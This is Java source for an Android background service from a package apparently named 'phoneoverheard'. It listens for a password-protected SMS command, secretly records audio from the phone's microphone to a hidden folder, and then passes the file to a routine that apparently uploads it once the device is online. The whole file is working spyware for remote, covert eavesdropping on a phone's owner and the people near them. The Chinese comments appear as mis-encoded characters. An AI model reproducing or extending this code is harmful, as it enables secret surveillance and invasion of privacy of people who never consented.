package com.phoneoverheard.phonne;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import com.phoneoverheard.database.SmscmdService;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;

@SuppressLint("SimpleDateFormat")
public class luyinService extends Service {
    private static final String TAG = "luyinService";
	private File file;
	private MediaRecorder mediaRecorder;
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	final String receiveTime = Dateformat.format(date);
	WriteLog mylog = new WriteLog();
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
    @Override  
    public void onCreate() {  
        super.onCreate(); 
        Log.i(TAG, "onCreate called.");  
    }
    
	@Override
    public void onDestroy() { 
        Log.i(TAG, "onDestroy called.");  
        stopMediaRecorder(); //ֹͣ¼��
        super.stopSelf();
        super.onDestroy();  
    }
    
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        Log.i(TAG, "onStartCommand called.");  
        return super.onStartCommand(intent, flags, startId);  
    }  
    
    @Override  
    public void onStart(Intent intent, int startId) {  
        Log.i(TAG, "onStart called.");  
        mylog.WrLog("i",TAG,"ִ��¼������");
        Bundle smscontent = intent.getBundleExtra("smscontent");// ����bundle��key�õ���Ӧ�Ķ���
        String content=smscontent.getString("content");
        String sendernumber=smscontent.getString("sendernumber"); 
        String[] contents = content.split("#");
        SmscmdService smscmdservice = new SmscmdService(getBaseContext());
        String password = smscmdservice.find("luyin").getPassword();		
        if(contents[0].equals("cmd") && contents[1].equals("luyin") && new FileService().MD5(contents[2]).equals(password)){
			startMediaRecorder(); //��ʼ¼��
		}else{
			// �ƶ���Ӫ������ÿ�η��͵��ֽ��������ޣ����ǿ���ʹ��Android�������ṩ �Ķ��Ź��ߡ�
	        SmsManager sms = SmsManager.getDefault();
	        String ErrMsg = "�������";
	        // �������û�г������Ƴ��ȣ��򷵻�һ�����ȵ�List��
	        List<String> texts = sms.divideMessage(ErrMsg);
	        for (String text : texts) {
	        	sms.sendTextMessage(sendernumber,null,text,null,null);
	        }
		}
    }
   
    /**
     * ������������ʼ¼��
     */
    @SuppressLint("SimpleDateFormat")
	public void startMediaRecorder() { 
		String sDir = Environment.getExternalStorageDirectory()+"/phonne";
		File destDir = new File(sDir);
		if (!destDir.exists()) {
		   destDir.mkdirs();
		}
		file = new File(sDir, "luyin"+receiveTime+ ".3gp");
		if(mediaRecorder == null){
			mediaRecorder = new MediaRecorder();
		}else{
			mediaRecorder.reset();
		}
		mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
	    // ����¼����ƵԴΪCamera(���)  
		//mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);  
	    // ����¼����ɺ���Ƶ�ķ�װ��ʽTHREE_GPPΪ3gp.MPEG_4Ϊmp4  
		mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
	    // ����¼�Ƶ���Ƶ����h263 h264  
	    //mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);  
	    // ������Ƶ¼�Ƶķֱ��ʡ�����������ñ���͸�ʽ�ĺ��棬���򱨴�  
	    //mediaRecorder.setVideoSize(320, 240);  
	    // ����¼�Ƶ���Ƶ֡�ʡ�����������ñ���͸�ʽ�ĺ��棬���򱨴�  
	    //mediaRecorder.setVideoFrameRate(20); 
		mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
		mediaRecorder.setOutputFile(file.getAbsolutePath());
		try {
			mediaRecorder.prepare();
		} catch (IllegalStateException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		mediaRecorder.start();//��ʼ¼��
		mylog.WrLog("i",TAG,"��ʼ¼��");
	}
    
    /**
     * ����������ֹͣ¼��
     */
    public void stopMediaRecorder() { 
		if(mediaRecorder != null){
			mylog.WrLog("i",TAG,"ֹͣ¼��");
			mediaRecorder.stop(); //ֹͣ¼��
			mediaRecorder.release();
			mediaRecorder = null;
			new FileService().CheckConnectInternet(file,getBaseContext());
		}  
	}
	
}
